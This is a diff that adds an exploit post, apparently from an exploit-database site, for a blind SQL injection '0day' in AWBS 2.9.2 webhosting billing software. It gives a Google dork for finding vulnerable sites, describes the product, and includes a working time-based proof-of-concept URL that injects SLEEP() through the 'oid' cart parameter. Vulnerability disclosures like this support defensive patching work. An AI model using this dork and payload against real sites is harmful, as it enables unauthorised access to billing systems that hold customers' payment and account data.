@@ -1,0 +1,42 @@
+AWBS 2.9.2 Blind SQL Injection 0day
+=============================================================================================
+Dork....: inurl:/cart?ca=add_other&oid=
+Date....: 01-16-2011
+Author..: ShivX
+Contact.: shivanx[at]gmail[dot]com
+Vendor..: http://www.awbs.com
+Link....: http://www.awbs.com/packages.php?spt=10 (or demo site)
+Version.: 2.9.2 (Possibly <=)
+Tested..: RedHat EL 5.6 (Tikanga)
+CVE.....: N/A (0day)
+=============================================================================================
+---Introduction---
+
+Advanced Webhost Billing System (AWBS) is webhosting billpay software written in PHP.
+AWBS includes a complete frontend written in XHTML/CSS. This frontend can be used as your
+website or in portal mode as a separate client portal and allows for full customization of
+its look.
+
+AWBS will communicate to your configured payment gateway(s) to perform live payments while
+customers place orders. Once orders are placed, AWBS will then communicate to your configured
+registrar, hosting server or reseller hosting account to complete the orders automatically,
+then send your configured email(s) to the client(s).
+
+AWBS will:
+- Generate invoices and email your clients notifying them a payment is due.
+- Automatically charge account balance or credit card on file on the invoice's due date.
+- Notify clients if the credit card on file is expired or declined.
+- Send domain renewal notices and automatically renew domains.
+- Suspend or unsuspend hosting accounts when a payment is not made or paid.
+
+The AWBS backend (admin interface) provides you with a quick and easy 'check in' homepage so
+you can find new orders, helpdesk tickets, contact form submissions, affiliate signups,
+overdue invoices, errors that may have occurred, and basic sales stats.
+=============================================================================================
+---Vulnerability---
+
+http(s)://[HOST]/cart?ca=add_other&oid=[TRUE VALUE]'[BLIND-SQL]
+=============================================================================================
+---PoC Using Time-Based Blind SQL Injection---
+
+https://www.vulnerablehost.com/cart?ca=add_other&oid=1'%20AND%20SLEEP(100)='
